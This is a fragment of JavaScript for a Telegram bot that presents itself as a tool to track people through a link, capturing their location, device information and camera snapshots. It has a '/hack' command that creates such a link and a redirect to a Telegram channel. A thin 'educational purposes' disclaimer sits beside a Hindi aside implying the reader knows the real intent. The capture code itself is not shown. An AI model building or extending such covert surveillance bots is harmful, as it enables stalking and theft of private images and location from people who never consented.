...
res.redirect("https://t.me/Backup_member");
}
...
bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track people get pics and many phone information just in seconds just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
}
else if(msg.text=="/hack"){
createNew(chatId);
}
...
\n\nIt is only for educational purposes we don't promote any illegal activities. (baki tum samjhdaar ho )
`);
}
